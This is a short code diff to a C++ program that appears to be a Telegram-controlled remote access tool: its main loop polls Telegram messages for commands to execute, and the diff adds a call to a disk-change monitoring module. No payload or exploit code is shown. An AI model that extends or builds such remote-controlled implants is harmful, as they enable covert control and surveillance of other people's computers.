@@ -9,6 +9,7 @@
 #include "parse.h"
 #include "execute.h"
 #include "tools.h"
+#include "diskchanges.h"
 
 #pragma comment(lib, "Crypt32.lib")
 
@@ -19,6 +20,8 @@ int main() {
 	int LastMessageId = -1;
 
 	while (true) {
+		diskchanges::Diskchanges();
+
 		Sleep(REFRESH * 1000);
 		json message = telegram::GetLastMessage();
 
